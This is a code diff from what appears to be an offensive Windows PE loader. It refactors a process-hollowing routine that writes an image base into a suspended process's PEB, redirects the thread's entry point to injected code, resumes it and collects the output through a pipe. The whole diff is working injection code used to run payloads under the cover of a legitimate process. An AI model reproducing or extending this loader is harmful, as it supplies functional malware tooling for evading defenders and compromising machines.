@@ -108,16 +108,7 @@ bool fixRelocTable(HANDLE pHandle, PPE_STRUCT myPE, LPVOID& allocAddrOnTarget, D
 }
 
 
-PWSTR strToWstr(PCHAR str)
-{
-	SIZE_T size = strlen(str);
-	PWSTR out = (PWSTR)LocalAlloc(LPTR, size * 2 + 2);
-	if (!out)
-		return nullptr;
-	for (int i = 0; i < size; ++i)
-		out[i] = str[i];
-	return out;
-}
+
 
 BOOL resolveAPISet(PWCHAR apiToResolve, PWCHAR& apiResolved)
 {
@@ -670,6 +661,58 @@ bool fixDelayedImports(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget
 
 }
 
+BOOL overwriteEntryPointAndResumeThread(LPPROCESS_INFORMATION pi, PPE_STRUCT myPE, PVOID allocAddrOnTarget)
+{
+	CONTEXT CTX = {};
+	CTX.ContextFlags = CONTEXT_FULL;
+
+	NTSTATUS status = myNtGetContextThread(pi->hThread, &CTX);
+	if (status != 0)
+	{
+		_dbg("[-] An error is occured when trying to get the thread context.\n");
+		return FALSE;
+	}
+
+	status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &myPE->ntHeader->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
+	if (status != 0)
+	{
+		_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
+		return FALSE;
+	}
+
+	CTX.Rcx = (DWORD64)allocAddrOnTarget + myPE->ntHeader->OptionalHeader.AddressOfEntryPoint;
+
+	status = myNtSetContextThread(pi->hThread, &CTX);
+	if (status != 0)
+	{
+		_dbg("[-] An error is occured when trying to set the thread context.\n");
+		return FALSE;
+	}
+
+	status = myNtResumeThread(pi->hThread, nullptr);
+	if (status != 0)
+	{
+		_err("Error in resuming thread: %x \r\n", status);
+		return FALSE;
+	}
+	return TRUE;
+}
+
+BOOL retrieveOutPut(HANDLE hThread, HANDLE hStdOut, PVOID* commandOutput,PDWORD bytesSize)
+{
+	DWORD timeout = INFINITE;
+	NTSTATUS status = myNtWaitForSingleObject(hThread, FALSE, PLARGE_INTEGER(&timeout));
+	if (status != 0)
+	{
+		_err("Error in waiting thread: %x\r\n", status);
+		return FALSE;
+	}
+
+	// Reading output one last time to check we don't leave anything behind...
+	readPipe(hStdOut, commandOutput, bytesSize);
+	return TRUE;
+}
+
 int main(int argc, char** argv)
 {
 
@@ -740,51 +783,16 @@ int main(int argc, char** argv)
 
 	CloseHandle(mod);
 
-	CONTEXT CTX = {};
-	CTX.ContextFlags = CONTEXT_FULL;
+	if (!overwriteEntryPointAndResumeThread(pi, myPE, allocAddrOnTarget))
+		exit(1);
 
-	NTSTATUS status = myNtGetContextThread(pi->hThread, &CTX);
-	if (status != 0)
-	{
-		_dbg("[-] An error is occured when trying to get the thread context.\n");
-		return FALSE;
-	}
-
-	status = myNtWrite(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &myPE->ntHeader->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
-	if (status != 0)
-	{
-		_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
-		return FALSE;
-	}
-
-	CTX.Rcx = (DWORD64)allocAddrOnTarget + myPE->ntHeader->OptionalHeader.AddressOfEntryPoint;
-
-	status = myNtSetContextThread(pi->hThread, &CTX);
-	if (status != 0)
-	{
-		_dbg("[-] An error is occured when trying to set the thread context.\n");
-		return FALSE;
-	}
-
-	status = myNtResumeThread(pi->hThread, nullptr);
-	PVOID commandOutput = nullptr;
+	PVOID output = nullptr;
 	DWORD bytesSize = 0;
-	DWORD timeout = 100;
-	while (myNtWaitForSingleObject(pi->hThread, FALSE,PLARGE_INTEGER(&timeout)) != WAIT_OBJECT_0) {
-		readPipe(hStdOut, &commandOutput, &bytesSize);
-		if (bytesSize > 0)
-		{
-			printf("%s\r\n", commandOutput);
-			DATA_FREE(commandOutput, bytesSize);
-		}
-	}
+	if (!retrieveOutPut(pi->hThread, hStdOut, &output, &bytesSize))
+		exit(1);
 
-	// Reading output one last time to check we don't leave anything behind...
-	readPipe(hStdOut, &commandOutput, &bytesSize);
 	if (bytesSize > 0)
-	{
-		printf("%s\r\n", commandOutput);
-	}
+		printf("%s\r\n", output);
 
 
 	return 0;
